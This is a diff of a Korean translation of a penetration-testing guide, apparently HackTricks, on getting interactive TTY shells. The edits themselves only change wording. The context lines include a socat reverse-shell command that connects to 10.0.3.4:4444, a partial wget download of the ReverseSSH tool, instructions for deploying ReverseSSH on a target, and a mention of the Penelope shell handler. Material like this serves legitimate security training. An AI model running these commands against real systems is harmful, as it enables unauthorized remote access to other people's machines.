@@ -69,7 +69,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 **대화형 쉘 접근** 및 **파일 전송**과 **포트 포워딩**을 위한 편리한 방법은 정적으로 연결된 ssh 서버 [ReverseSSH](https://github.com/Fahrj/reverse-ssh)를 타겟에 배포하는 것입니다.
 
-아래는 upx로 압축된 바이너리를 사용하는 `x86`의 예입니다. 다른 바이너리에 대한 정보는 [릴리스 페이지](https://github.com/Fahrj/reverse-ssh/releases/latest/)를 확인하세요.
+아래는 upx로 압축된 바이너리를 사용하는 `x86`의 예입니다. 다른 바이너리에 대해서는 [릴리스 페이지](https://github.com/Fahrj/reverse-ssh/releases/latest/)를 확인하세요.
 
 1. ssh 포트 포워딩 요청을 수신하기 위해 로컬에서 준비합니다:
 
@@ -93,7 +93,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2b) Windows 10 대상 (이전 버전의 경우 [프로젝트 읽기](https://github.com/Fahrj/reverse-ssh#features) 확인):
+* (2b) Windows 10 대상 (이전 버전은 [프로젝트 읽기](https://github.com/Fahrj/reverse-ssh#features)를 확인하세요):
 
 {% code overflow="wrap" %}
 ```bash
@@ -114,7 +114,7 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-Penelope (https://github.com/brightio/penelope)는 리눅스 리버스 셸을 자동으로 TTY로 업그레이드하고, 터미널 크기를 처리하며, 모든 것을 기록하고 그 외에도 많은 기능을 제공합니다. 또한 Windows 셸에 대한 readline 지원을 제공합니다.
+[Penelope](https://github.com/brightio/penelope)는 리눅스 리버스 셸을 자동으로 TTY로 업그레이드하고, 터미널 크기를 처리하며, 모든 것을 기록하고 그 외에도 많은 기능을 제공합니다. 또한 Windows 셸에 대한 readline 지원을 제공합니다.
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
